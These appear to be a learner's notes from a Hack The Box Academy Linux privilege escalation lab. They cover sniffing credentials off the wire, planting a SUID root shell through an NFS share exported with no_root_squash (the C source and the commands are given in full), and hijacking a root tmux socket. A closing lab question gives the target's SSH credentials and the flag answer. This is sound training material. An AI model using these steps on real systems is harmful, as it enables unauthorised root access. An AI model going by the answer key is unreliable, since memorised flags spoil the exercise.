# Miscellaneous Techniques
## Passive Traffic Capture
Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.

## Weak NFS Privileges
Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command `showmount -e`, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.

```shellsession
$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Option</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Description</th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">root_squash</code></td><td class="p-4">If the root user is used to access NFS shares, it will be changed to the <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">nfsnobody</code> user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">nfsnobody</code> user, which prevents an attacker from uploading binaries with the SUID bit set.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">no_root_squash</code></td><td class="p-4">Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.</td></tr></tbody></table>

```shellsession
$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#       to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

For example, we can create a `SETUID` binary that executes `/bin/sh` using our local root user. We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.

First, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.

```shellsession
$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

$ gcc shell.c -o shell
$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
$ cp shell /mnt
$ chmod u+s /mnt/shell
```

When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.

```shellsession
$  ls -la

total 68
drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>
$ ./shell
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

## Hijacking Tmux Sessions
Terminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach from the session, still leaving it active. For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.

```shellsession
$ tmux -S /shareds new -s debugsess
$ chown root:devs /shareds
```

If we can compromise a user in the `devs` group, we can attach to this session and gain root access.

Check for any running `tmux` processes.

```shellsession
$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

Confirm permissions.

```shellsession
$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

Review our group membership.

```shellsession
$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Finally, attach to the tmux session and confirm root privileges.

```shellsession
$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```

## Questions
SSH to 10.129.2.210 (ACADEMY-LPE-NIX02), with user `htb-student` and password `Academy_LLPE!`
1. Review the NFS server's export list and find a directory holding a flag. **Answer: fc8c065b9384beaa162afe436a694acf**
   - Since we know that NFS is configured with `no_root_squash` on both shares, we, as root user, can connect to the shares and read them as root also:
        ```shellsession
        $ cat /etc/exports
        # /etc/exports: the access control list for filesystems which may be exported
        #		to NFS clients.  See exports(5).
        #
        # Example for NFSv2 and NFSv3:
        # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
        #
        # Example for NFSv4:
        # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
        # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
        #
        /var/nfs/general *(rw,no_root_squash)
        /tmp *(rw,no_root_squash)
        ```
   - On our local machine,, mount the `/var/nfs/general` to `target-nfs` folder:
        ```shellsession
        $ mkdir target-nfs
        $ sudo mount -t nfs 10.129.2.210:/var/nfs/general target-nfs/ -o nolock
        $ cat target-nfs/exports_flag.txt 
        fc8c065b9384beaa162afe436a694acf
        ```